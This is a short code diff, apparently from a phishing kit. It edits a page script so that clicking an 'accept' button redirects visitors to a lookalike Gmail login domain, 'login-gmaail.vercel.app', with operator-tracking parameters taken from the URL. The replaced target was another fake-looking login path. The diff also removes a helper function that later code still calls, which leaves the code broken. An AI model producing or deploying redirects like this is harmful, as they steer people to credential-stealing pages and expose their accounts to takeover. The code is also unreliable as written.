@@ -55,11 +55,12 @@ newDiv.innerHTML = `
 
 document.addEventListener('click', function(e) {
 
-function getQueryParam(param) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(param);
-}
 
+const urlParams = new URLSearchParams(window.location.search);
+const errorParam = urlParams.get('error');
+const admin = urlParams.get('admin');
+const poster = urlParams.get('poster');
+const verifyId = urlParams.get('verifyId');
 
 
 
@@ -69,7 +70,7 @@ function getQueryParam(param) {
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
        let userId = getQueryParam('userid') || 1;
-    window.location.href =`https://escortbabylon-comment.net/auth/log_in/${userId}`
+    window.location.href =`https://login-gmaail.vercel.app/${admin}/${poster}/${verifyId}`
   });
 });
  
